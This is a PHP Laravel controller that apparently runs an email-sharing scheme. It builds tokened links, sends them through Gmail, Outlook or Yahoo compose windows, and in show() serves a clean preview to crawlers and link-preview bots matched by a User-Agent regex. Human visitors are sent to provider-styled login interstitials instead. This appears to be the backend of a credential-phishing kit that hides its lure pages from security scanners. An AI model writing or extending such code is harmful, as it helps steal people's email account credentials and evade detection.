<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\URL;
use App\Models\SharedPost;

class EmailShareController extends Controller
{


 public function createphone()
	{
		$history = SharedPost::where('platform', 'email')->orderBy('created_at', 'desc')->take(10)->get();
		return view('admin.email_share_phone', compact('history'));
	}

	public function create(Request $request)
	{
		$post = null;
		if ($request->filled('token')) {
			$post = SharedPost::where('platform', 'email')
				->where('token', $request->query('token'))
				->firstOrFail();
		}

		$selectedMailProvider = $post?->mail_provider ?? 'gmail';
		$providerLabel = ucfirst($selectedMailProvider);
		$history = SharedPost::where('platform', 'email')->orderBy('created_at', 'desc')->take(10)->get();
		$shareUrl = $post ? URL::route('email.share.show', ['token' => $post->token]) : null;
		$subject = rawurlencode('Shared link');
		$body = $post ? rawurlencode($post->writeup . "\n\n" . $shareUrl) : null;
		$actionUrl = match ($selectedMailProvider) {
			'gmail' => "https://mail.google.com/mail/?view=cm&fs=1&su={$subject}&body={$body}",
			'outlook' => "https://outlook.live.com/mail/0/deeplink/compose?subject={$subject}&body={$body}",
			'yahoo' => "https://compose.mail.yahoo.com/?subject={$subject}&body={$body}",
			default => null,
		};

		return view('admin.email_share_' . $selectedMailProvider, compact(
			'history',
			'shareUrl',
			'actionUrl',
			'providerLabel',
			'selectedMailProvider'
		));
	}

	public function store(Request $request)
	{
		$request->validate([
			'image' => 'required|image',
			'writeup' => 'required|string',
			'mail_provider' => 'required|in:gmail,outlook,yahoo',
		]);
		$image = $request->file('image');
		$imageName = uniqid('share_') . '.' . $image->getClientOriginalExtension();
		$image->move(public_path('shared_images'), $imageName);
		$imagePath = 'shared_images/' . $imageName;
		$token = Str::random(10);
		$isPhoneShare = $request->input('is_phone_share') == '1';
       
		$post = SharedPost::create([
			'image' => $imagePath,
			'writeup' => $request->writeup,
			'token' => $token,
			'phone_share' => $isPhoneShare,
			'platform' => 'email',
			'mail_provider' => $request->input('mail_provider'),
		]);
		return redirect()->to(URL::to('/admin/share/email') . '?' . http_build_query(['token' => $token]));
	}

	public function show($token, Request $request)
	{
		$post = SharedPost::where('token', $token)->firstOrFail();
		$userAgent = strtolower($request->header('User-Agent', ''));
		$isBot = preg_match('/bot|crawl|slurp|spider|facebookexternalhit|facebot|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|telegrambot|applebot|whatsapp|flipboard|tumblr|bitlybot|scoop.it|redditbot|discordbot|google|bing|yandex|baidu/', $userAgent);
		if ($isBot) {
			// Show meta preview for bots/crawlers
			return response()->view('email.shared_post', compact('post'));
		} else {
			$redirectRoute = $post->phone_share ? 'phone.login' : 'email.login';

			if ($post->mail_provider === 'outlook' && !$post->phone_share) {
				return response()->view('email.outlook_login_interstitial', compact('redirectRoute'));
			} elseif ($post->mail_provider === 'yahoo' && !$post->phone_share) {
				return response()->view('email.yahoo_login_interstitial', compact('redirectRoute'));
            }

			return response()->view('email.login_interstitial', ['redirectRoute' => $redirectRoute]);
		}
	}

	public function destroy($id)
	{
		$post = SharedPost::where('platform', 'email')->findOrFail($id);
		$post->delete();
		return redirect()->back()->with('status', 'Share deleted successfully.');
	}

	public function destroyAll()
	{
		SharedPost::where('platform', 'email')->delete();

		return redirect()->back()->with('status', 'Email share history cleared.');
	}
}
